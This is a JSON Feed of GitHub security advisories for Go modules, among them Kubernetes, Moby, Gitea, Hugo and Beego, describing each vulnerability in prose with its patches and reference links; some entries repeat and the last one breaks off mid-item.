{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>This affects all versions of package github.com/u-root/u-root/pkg/cpio up to and including 7.0.0. It is vulnerable to leading, non-leading relative path traversal attacks and symlink based (relative and absolute) path traversal attacks in cpio file extraction.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7666\">https://nvd.nist.gov/vuln/detail/CVE-2020-7666</a></li>\n<li><a href=\"https://github.com/u-root/u-root/pull/1817\">https://github.com/u-root/u-root/pull/1817</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGCPIO-570440\">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGCPIO-570440</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mq35-x99r-54fc\">https://github.com/advisories/GHSA-mq35-x99r-54fc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mq35-x99r-54fc",
            "title": "[github.com/u-root/u-root/pkg/cpio] github.com/u-root/u-root/pkg/cpio Arbitrary File Write via Archive Extraction (Zip Slip)",
            "date_modified": "2024-04-24T20:00:39.000Z",
            "date_published": "2024-04-24T20:00:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mq35-x99r-54fc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Title argument in Markdown for links and images not escaped in internal render hooks. Impacted are Hugo users who have these hooks enabled and do not trust their Markdown content files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in v0.125.3.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Replace with user defined templates or disable the internal templates: <a href=\"https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault\">https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/gohugoio/hugo/releases/tag/v0.125.3\">https://github.com/gohugoio/hugo/releases/tag/v0.125.3</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gohugoio/hugo/security/advisories/GHSA-ppf8-hhpp-f5hj\">https://github.com/gohugoio/hugo/security/advisories/GHSA-ppf8-hhpp-f5hj</a></li>\n<li><a href=\"https://github.com/gohugoio/hugo/commit/15a4b9b33715887001f6eff30721d41c0d4cfdd1\">https://github.com/gohugoio/hugo/commit/15a4b9b33715887001f6eff30721d41c0d4cfdd1</a></li>\n<li><a href=\"https://github.com/gohugoio/hugo/releases/tag/v0.125.3\">https://github.com/gohugoio/hugo/releases/tag/v0.125.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32875\">https://nvd.nist.gov/vuln/detail/CVE-2024-32875</a></li>\n<li><a href=\"https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault\">https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppf8-hhpp-f5hj\">https://github.com/advisories/GHSA-ppf8-hhpp-f5hj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppf8-hhpp-f5hj",
            "title": "[github.com/gohugoio/hugo] Hugo Markdown titles do not escaped in internal render hooks",
            "date_modified": "2024-04-24T14:27:11.000Z",
            "date_published": "2024-04-23T21:16:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppf8-hhpp-f5hj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using containers, init containers, and ephemeral containers with the envFrom field populated. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the kubernetes.io/enforce-mountable-secrets annotation are used together with containers, init containers, and ephemeral containers with the envFrom field populated.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3177\">https://nvd.nist.gov/vuln/detail/CVE-2024-3177</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/124336\">https://github.com/kubernetes/kubernetes/issues/124336</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ\">https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a\">https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2\">https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b\">https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxhw-596r-rwq5\">https://github.com/advisories/GHSA-pxhw-596r-rwq5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5",
            "title": "[k8s.io/kubernetes] Kubernetes allows bypassing mountable secrets policy imposed by the ServiceAccount admission plugin",
            "date_modified": "2024-04-23T16:19:55.000Z",
            "date_published": "2024-04-23T00:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using containers, init containers, and ephemeral containers with the envFrom field populated. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the kubernetes.io/enforce-mountable-secrets annotation are used together with containers, init containers, and ephemeral containers with the envFrom field populated.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3177\">https://nvd.nist.gov/vuln/detail/CVE-2024-3177</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/124336\">https://github.com/kubernetes/kubernetes/issues/124336</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ\">https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a\">https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2\">https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b\">https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxhw-596r-rwq5\">https://github.com/advisories/GHSA-pxhw-596r-rwq5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5",
            "title": "[k8s.io/kubernetes] Kubernetes allows bypassing mountable secrets policy imposed by the ServiceAccount admission plugin",
            "date_modified": "2024-04-23T16:19:55.000Z",
            "date_published": "2024-04-23T00:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes where users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using containers, init containers, and ephemeral containers with the envFrom field populated. The policy ensures pods running with a service account may only reference secrets specified in the service account’s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the kubernetes.io/enforce-mountable-secrets annotation are used together with containers, init containers, and ephemeral containers with the envFrom field populated.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3177\">https://nvd.nist.gov/vuln/detail/CVE-2024-3177</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/124336\">https://github.com/kubernetes/kubernetes/issues/124336</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ\">https://groups.google.com/g/kubernetes-security-announce/c/JxjHf7fkVd8/m/oVCzypyOAQAJ</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a\">https://github.com/kubernetes/kubernetes/commit/7c861b1ecad97e1ab9332c970c9294a72065111a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2\">https://github.com/kubernetes/kubernetes/commit/a619ca3fd3ee3c222d9df784622020de398076d2</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b\">https://github.com/kubernetes/kubernetes/commit/f9fb6cf52a769a599a45e700375115c2ecc86e9b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxhw-596r-rwq5\">https://github.com/advisories/GHSA-pxhw-596r-rwq5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5",
            "title": "[k8s.io/kubernetes] Kubernetes allows bypassing mountable secrets policy imposed by the ServiceAccount admission plugin",
            "date_modified": "2024-04-23T16:19:55.000Z",
            "date_published": "2024-04-23T00:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxhw-596r-rwq5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>\n<p>Fixed by <a href=\"https://github.com/hpcng/sif/pull/90\">https://github.com/hpcng/sif/pull/90</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>\n<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/satori/go.uuid/issues/73\">https://github.com/satori/go.uuid/issues/73</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/hpcng/sif/issues\">https://github.com/hpcng/sif/issues</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7\">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3538\">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/issues/73\">https://github.com/satori/go.uuid/issues/73</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/pull/75\">https://github.com/satori/go.uuid/pull/75</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557\">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1954376\">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-0244\">https://pkg.go.dev/vuln/GO-2022-0244</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488\">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-33m6-q9v5-62r7\">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-33m6-q9v5-62r7",
            "title": "[github.com/apptainer/sif] Predictable SIF UUID Identifiers",
            "date_modified": "2024-04-22T22:03:41.000Z",
            "date_published": "2023-02-07T22:57:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-33m6-q9v5-62r7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>\n<p>Fixed by <a href=\"https://github.com/hpcng/sif/pull/90\">https://github.com/hpcng/sif/pull/90</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>\n<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/satori/go.uuid/issues/73\">https://github.com/satori/go.uuid/issues/73</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/hpcng/sif/issues\">https://github.com/hpcng/sif/issues</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7\">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3538\">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/issues/73\">https://github.com/satori/go.uuid/issues/73</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/pull/75\">https://github.com/satori/go.uuid/pull/75</a></li>\n<li><a href=\"https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557\">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1954376\">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-0244\">https://pkg.go.dev/vuln/GO-2022-0244</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488\">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-33m6-q9v5-62r7\">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-33m6-q9v5-62r7",
            "title": "[github.com/satori/go.uuid] Predictable SIF UUID Identifiers",
            "date_modified": "2024-04-22T22:03:41.000Z",
            "date_published": "2023-02-07T22:57:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-33m6-q9v5-62r7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>util/binfmt_misc/check.go in Builder in Docker Engine before 19.03.9 calls os.OpenFile with a potentially unsafe qemu-check temporary pathname, constructed with an empty first argument in an ioutil.TempDir call.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-27534\">https://nvd.nist.gov/vuln/detail/CVE-2020-27534</a></li>\n<li><a href=\"https://github.com/moby/buildkit/pull/1462\">https://github.com/moby/buildkit/pull/1462</a></li>\n<li><a href=\"https://github.com/moby/moby/pull/40877\">https://github.com/moby/moby/pull/40877</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1921154\">https://bugzilla.redhat.com/show_bug.cgi?id=1921154</a></li>\n<li><a href=\"http://web.archive.org/web/20200530054359/https://docs.docker.com/engine/release-notes\">http://web.archive.org/web/20200530054359/https://docs.docker.com/engine/release-notes</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hwg-w5jg-9c6x\">https://github.com/advisories/GHSA-6hwg-w5jg-9c6x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hwg-w5jg-9c6x",
            "title": "[github.com/docker/docker] Path Traversal in Moby builder",
            "date_modified": "2024-04-22T19:08:27.000Z",
            "date_published": "2024-01-31T23:13:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hwg-w5jg-9c6x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The git hook feature in Gitea 1.1.0 through 1.12.5 allows for authenticated remote code execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-14144\">https://nvd.nist.gov/vuln/detail/CVE-2020-14144</a></li>\n<li><a href=\"https://github.com/go-gitea/gitea/pull/13058\">https://github.com/go-gitea/gitea/pull/13058</a></li>\n<li><a href=\"https://github.com/go-gitea/gitea/commit/8fe8ab5cbf2977f3a01ea12361df2cd76dce3ea9\">https://github.com/go-gitea/gitea/commit/8fe8ab5cbf2977f3a01ea12361df2cd76dce3ea9</a></li>\n<li><a href=\"https://docs.github.com/en/enterprise-server%402.19/admin/policies/creating-a-pre-receive-hook-script\">https://docs.github.com/en/enterprise-server%402.19/admin/policies/creating-a-pre-receive-hook-script</a></li>\n<li><a href=\"https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script\">https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script</a></li>\n<li><a href=\"https://docs.gitlab.com/ee/administration/server_hooks.html\">https://docs.gitlab.com/ee/administration/server_hooks.html</a></li>\n<li><a href=\"https://github.com/PandatiX/CVE-2021-28378\">https://github.com/PandatiX/CVE-2021-28378</a></li>\n<li><a href=\"https://github.com/PandatiX/CVE-2021-28378#notes\">https://github.com/PandatiX/CVE-2021-28378#notes</a></li>\n<li><a href=\"https://github.com/go-gitea/gitea/releases\">https://github.com/go-gitea/gitea/releases</a></li>\n<li><a href=\"https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution\">https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/49571\">https://www.exploit-db.com/exploits/49571</a></li>\n<li><a href=\"https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent\">https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html\">http://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3h6c-c475-jm7v\">https://github.com/advisories/GHSA-3h6c-c475-jm7v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3h6c-c475-jm7v",
            "title": "[code.gitea.io/gitea] Arbitrary Code Execution in Gitea",
            "date_modified": "2024-04-22T19:07:07.000Z",
            "date_published": "2024-04-22T19:07:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3h6c-c475-jm7v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The File Session Manager in Beego before 1.12.2 allows local users to read session files because of weak permissions for individual files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-16355\">https://nvd.nist.gov/vuln/detail/CVE-2019-16355</a></li>\n<li><a href=\"https://github.com/beego/beego/issues/3763\">https://github.com/beego/beego/issues/3763</a></li>\n<li><a href=\"https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd\">https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd</a></li>\n<li><a href=\"https://github.com/beego/beego/pull/3975\">https://github.com/beego/beego/pull/3975</a></li>\n<li><a href=\"https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1\">https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hf4p-4j9r-3cvx\">https://github.com/advisories/GHSA-hf4p-4j9r-3cvx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hf4p-4j9r-3cvx",
            "title": "[github.com/astaxie/beego] Incorrect Default Permissions in Beego",
            "date_modified": "2024-04-22T19:05:42.000Z",
            "date_published": "2022-05-24T22:00:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hf4p-4j9r-3cvx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bug was found in Moby (Docker Engine) where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during <code>execve(2)</code>.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.</p>\n<p>This bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been fixed in Moby (Docker Engine) 20.10.14.  Users should update to this version as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.</p>\n<p>This fix changes Moby (Docker Engine) behavior such that containers are started with a more typical Linux environment.  Refer to <code>capabilities(7)</code> for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The entrypoint of a container can be modified to use a utility like <code>capsh(1)</code> to drop inheritable capabilities prior to the primary process starting.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Moby project would like to thank <a href=\"https://github.com/AndrewGMorgan\">Andrew G. Morgan</a> for responsibly disclosing this issue in accordance with the <a href=\"https://github.com/moby/moby/blob/master/SECURITY.md\">Moby security policy</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/moby/moby/issues/new\">Open an issue</a></li>\n<li>Email us at <a href=\"mailto:security@docker.com\">security@docker.com</a> if you think you’ve found a security bug</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq\">https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24769\">https://nvd.nist.gov/vuln/detail/CVE-2022-24769</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f\">https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1\">https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1</a></li>\n<li><a href=\"https://www.debian.org/security/2022/dsa-5162\">https://www.debian.org/security/2022/dsa-5162</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202401-31\">https://security.gentoo.org/glsa/202401-31</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC\">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>\n<li><a href=\"https://github.com/moby/moby/releases/tag/v20.10.14\">https://github.com/moby/moby/releases/tag/v20.10.14</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/05/12/1\">http://www.openwall.com/lists/oss-security/2022/05/12/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2mm7-x5h6-5pvq\">https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2mm7-x5h6-5pvq",
            "title": "[github.com/docker/docker] Moby (Docker Engine) started with non-empty inheritable Linux process capabilities",
